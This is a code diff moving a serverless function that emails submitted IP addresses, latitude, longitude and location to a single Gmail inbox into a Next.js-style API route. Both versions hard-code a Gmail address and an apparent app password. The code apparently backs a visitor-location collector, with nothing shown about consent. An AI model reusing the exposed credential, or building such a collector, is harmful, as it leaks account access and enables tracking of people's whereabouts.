@@ -1,43 +1,34 @@
 const nodemailer = require('nodemailer');
 
-exports.handler = async (event) => {
-    const data = JSON.parse(event.body);
+export default async function handler(req, res) {
+    if (req.method === 'POST') {
+        const { ip, latitude, longitude, location } = req.body;
 
-    if (!data.ip || !data.latitude || !data.longitude || !data.location) {
-        return {
-            statusCode: 400,
-            body: 'Missing required data',
+        // Set up nodemailer transporter
+        const transporter = nodemailer.createTransport({
+            service: 'gmail',
+            auth: {
+                user: 'afrikel173@gmail.com',  // Replace with your Gmail address
+                pass: 'nxcn jrsx vavw byzz'      // Replace with your app password
+            }
+        });
+
+        // Prepare the email content
+        const mailOptions = {
+            from: 'afrikel173@gmail.com',
+            to: 'afrikel173@gmail.com',  // Replace with the email you want to receive the data
+            subject: 'Location Data',
+            text: `IP: ${ip}\nLatitude: ${latitude}\nLongitude: ${longitude}\nLocation: ${location}`
         };
+
+        // Send the email
+        try {
+            await transporter.sendMail(mailOptions);
+            res.status(200).json({ message: 'Location sent successfully!' });
+        } catch (error) {
+            res.status(500).json({ error: 'Failed to send email', details: error.message });
+        }
+    } else {
+        res.status(405).json({ error: 'Method Not Allowed' });
     }
-
-    const content = `IP: ${data.ip}, Latitude: ${data.latitude}, Longitude: ${data.longitude}, Location: ${data.location}\n`;
-
-    const transporter = nodemailer.createTransport({
-        service: 'gmail',
-        auth: {
-            user: 'afrikel173@gmail.com',  // Your email address
-            pass: 'nxcn jrsx vavw byzz', // Use the app password here
-        },
-    });
-
-    const mailOptions = {
-        from: 'afrikel173@gmail.com',
-        to: 'afrikel173@gmail.com',  // You can set this to your desired recipient
-        subject: 'New Location Data Received',
-        text: content,
-    };
-
-    try {
-        await transporter.sendMail(mailOptions);
-        return {
-            statusCode: 200,
-            body: 'Location data saved and email sent successfully',
-        };
-    } catch (error) {
-        console.error('Error sending email:', error);
-        return {
-            statusCode: 500,
-            body: 'Error sending email',
-        };
-    }
-};
+}
